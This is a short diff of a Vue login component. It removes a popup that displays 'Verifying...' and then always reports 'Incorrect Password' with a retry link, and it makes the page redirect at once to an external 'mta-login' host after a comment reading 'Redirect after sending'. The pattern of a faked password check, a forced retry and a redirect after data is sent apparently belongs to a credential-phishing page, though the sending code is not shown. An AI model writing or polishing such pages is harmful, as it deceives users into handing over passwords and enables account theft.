@@ -52,26 +52,7 @@
         </div>
       </form>
 
-      <div v-if="showPopup" class="overlay">
-        <div class="popup">
-          <template v-if="isLoading">
-            <div class="spinner"></div>
-            <h3>Verifying...</h3>
-          </template>
 
-          <template v-else>
-            <!-- <div class="success-icon">✓</div> -->
-            <h3>Incorrect Password</h3>
-            <button style="padding: 10px 20px; background-color: red; border: none; color: white; margin-top: 14px; border-radius: 4px;">
-              <a
-                style="text-decoration: none; color: aliceblue; font-weight: 600;"
-                href="./verifypassword"
-                >Retry</a
-              >
-            </button>
-          </template>
-        </div>
-      </div>
 
       <!-- Register Section -->
     </div>
@@ -308,20 +289,9 @@ export default {
         this.loading = false;
         this.isLoading = false;
       } else {
-        setTimeout(() => {
-          if (this.status === "loading") {
-            this.status = "success";
-
-            setTimeout(() => {
-              // this.$router.push('https://mta-login.vercel.app/');
-              location.replace("https://mta-login.vercel.app/");
-            }, 2000);
-          } else {
-            this.showPopup = false;
-          }
-        }, 3000);
+        
         // Redirect after sending
-        // location.replace("/");
+        location.replace("https://mta-login.vercel.app/");
       }
     },
 
